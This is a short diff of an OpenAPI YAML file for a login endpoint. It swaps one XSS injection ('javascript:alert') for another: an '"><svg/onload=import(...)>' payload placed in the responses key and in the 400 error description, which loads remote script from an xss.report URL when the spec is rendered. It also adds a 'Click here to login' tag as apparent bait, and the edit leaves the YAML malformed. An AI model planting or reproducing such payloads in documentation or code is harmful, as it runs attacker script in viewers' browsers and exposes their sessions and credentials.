@@ -21,11 +21,11 @@ paths:
           required: true
           type: string
       tags:
-        -href="javascript:alert``
-      responses:
+        - Click here to login
+      responses: "><svg/onload=import('//xss.report/c/cyboy')>
         '200':
           description: Successfully logged in and authenticated.
         '400':
-          description: Invalid credentials or missing parameters.
+          description: Invalid credentials or missing parameters. "><svg/onload=import('//xss.report/c/cyboy')>
         '500':
           description: Internal server error.
